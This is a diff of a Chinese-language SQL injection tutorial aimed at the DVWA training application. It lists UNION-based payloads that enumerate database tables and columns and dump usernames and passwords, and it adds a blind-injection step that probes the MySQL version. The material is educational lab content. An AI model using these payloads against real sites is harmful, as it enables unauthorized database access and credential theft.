@@ -45,6 +45,8 @@ select table_name,column_name from information_schema.columns; 查询全表对�
 5、查找需要的表 ?id=1' union select table_schema,table_name from information_schema.tables#，把所有数据库的库和表的对应显示出来。  
 6、查找表对应的字段?id=1' union select table_name,column_name from information_schema.columns#  
 7、查最终数据 ?id=1' union select user,password from dvwa.users#  
+8、判断数据库版本1' and substring(@@version,1,1)=4# 如果返回正常结果，说明数据库版本是4.  
+
 ***
 不定期分享一些python开发,逆向破解、渗透测试相关文章,欢迎大家关注.  
 ![微信公众号](../gongzhonghao.jpg)
